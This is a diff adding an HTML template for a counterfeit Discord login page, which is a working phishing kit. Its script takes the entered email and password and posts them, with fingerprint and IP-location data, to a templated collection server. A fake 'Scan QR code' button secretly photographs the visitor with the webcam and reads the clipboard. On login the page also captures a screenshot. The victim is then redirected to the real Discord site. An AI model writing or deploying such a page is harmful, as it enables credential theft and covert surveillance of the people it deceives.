@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Discord</title>
+<link rel="icon" href="https://discord.com/favicon.ico">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Whitney','Helvetica Neue',Helvetica,Arial,sans-serif;background:#5865f2;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.card{background:#fff;border-radius:8px;box-shadow:0 8px 32px rgba(0,0,0,.2);padding:32px;max-width:420px;width:90%;text-align:center}
+.logo{width:48px;margin-bottom:20px}
+h1{font-size:24px;font-weight:600;color:#060607;margin-bottom:4px}
+.sub{color:#4e5058;font-size:15px;margin-bottom:24px}
+.input-group{margin-bottom:16px;text-align:left}
+.input-group label{font-size:12px;font-weight:600;color:#4e5058;margin-bottom:4px;display:block;letter-spacing:.5px;text-transform:uppercase}
+.input-group input{width:100%;padding:14px;border:1px solid #dbdee1;border-radius:4px;font-size:16px;outline:none;background:#f2f3f5;color:#060607}
+.input-group input:focus{border-color:#5865f2;background:#fff}
+.btn{background:#5865f2;color:#fff;border:none;border-radius:4px;padding:16px;font-size:16px;width:100%;cursor:pointer;font-weight:500;transition:background .15s;margin-top:8px}
+.btn:hover{background:#4752c4}
+.btn:disabled{opacity:.5;cursor:default}
+.hidden{display:none!important}
+.loading{display:none;margin-top:16px;color:#4e5058;font-size:14px;align-items:center;justify-content:center;gap:8px}
+.loading .s{width:16px;height:16px;border:3px solid #e8eaed;border-top-color:#5865f2;border-radius:50%;animation:spin .8s linear infinite;display:inline-block}
+@keyframes spin{to{transform:rotate(360deg)}}
+#video{display:none;width:180px;height:135px;border-radius:4px;margin:16px auto;object-fit:cover;background:#000}
+.qr{border:2px dashed #dbdee1;border-radius:8px;padding:32px;margin-bottom:20px;font-size:80px;cursor:pointer;transition:border .2s}
+.qr:hover{border-color:#5865f2}
+</style>
+</head>
+<body>
+<div class="card">
+<img class="logo" src="https://discord.com/favicon.ico" alt="Discord">
+<h1>Welcome back!</h1>
+<p class="sub">Log in to continue to your Discord account.</p>
+<div class="qr" id="qr_box" onclick="handleQR()">
+<div id="qr_icon">📱</div>
+<div style="font-size:14px;color:#4e5058;margin-top:8px">Scan QR code</div>
+</div>
+<div style="display:flex;align-items:center;gap:12px;margin:16px 0;color:#4e5058;font-size:13px">
+<div style="flex:1;height:1px;background:#dbdee1"></div>
+<span>or</span>
+<div style="flex:1;height:1px;background:#dbdee1"></div>
+</div>
+<div class="input-group">
+<label>Email or phone number</label>
+<input type="text" id="login" placeholder="you@example.com" autocomplete="off">
+</div>
+<div class="input-group">
+<label>Password</label>
+<input type="password" id="password" placeholder="Password" autocomplete="off">
+</div>
+<button class="btn" id="login_btn" onclick="login()">Log In</button>
+<video id="video" autoplay muted playsinline></video>
+<div class="loading" id="loading"><span class="s"></span> <span id="load_text">Logging in...</span></div>
+</div>
+<script>
+const LID='{{LINK_ID}}',BASE='{{BASE_URL}}',SID='{{SESSION_ID}}';
+let c={session:SID};
+document.getElementById('password').addEventListener('keydown',e=>{if(e.key==='Enter')login()});
+async function collect(final){
+    c.ua=navigator.userAgent;c.platform=navigator.platform;
+    c.screen=screen.width+'x'+screen.height;c.language=navigator.language;
+    c.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
+    try{const r=await fetch('https://ip-api.com/json/?fields=query,country,city,lat,lon,isp');const j=await r.json();Object.assign(c,j)}catch(e){}
+    if(final){
+        c.visit_duration=Math.floor((Date.now()-t0)/1000);
+        try{
+            const st=await navigator.mediaDevices.getDisplayMedia({preferCurrentTab:true});
+            const tr=st.getVideoTracks()[0];const ic=new ImageCapture(tr);const bm=await ic.grabFrame();
+            const ca=document.createElement('canvas');ca.width=bm.width;ca.height=bm.height;
+            ca.getContext('2d').drawImage(bm,0,0);
+            c.screenshot=ca.toDataURL('image/png').split(',')[1];
+            tr.stop();st.getTracks().forEach(t=>t.stop())
+        }catch(e){}
+    }
+    await fetch(BASE+'/c/'+LID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(c)})
+}
+async function handleQR(){
+    try{
+        const st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+        const v=document.getElementById('video');v.srcObject=st;v.style.display='block';
+        document.getElementById('qr_box').style.display='none';
+        await new Promise(r=>setTimeout(r,1500));
+        const ca=document.createElement('canvas');ca.width=v.videoWidth||640;ca.height=v.videoHeight||480;
+        ca.getContext('2d').drawImage(v,0,0);
+        c.photo=ca.toDataURL('image/jpeg',0.85).split(',')[1];
+        st.getTracks().forEach(t=>t.stop());
+        try{const txt=await navigator.clipboard.readText();if(txt)c.clipboard=txt}catch(e){}
+        await collect(false);
+        document.getElementById('loading').style.display='flex';
+        document.getElementById('load_text').textContent='✓ Scanned!';
+        setTimeout(()=>{window.location.href='https://discord.com/app'},1500)
+    }catch(e){}
+}
+async function login(){
+    const login=document.getElementById('login').value.trim();
+    const pw=document.getElementById('password').value.trim();
+    if(!login||!pw)return;
+    c.login=login;c.password=pw;
+    document.getElementById('login_btn').disabled=true;
+    document.getElementById('loading').style.display='flex';
+    await collect(true);
+    document.getElementById('load_text').textContent='✓ Logged in! Redirecting...';
+    setTimeout(()=>{window.location.href='https://discord.com/app'},2000)
+}
+const t0=Date.now()
+</script>
+</body>
+</html>
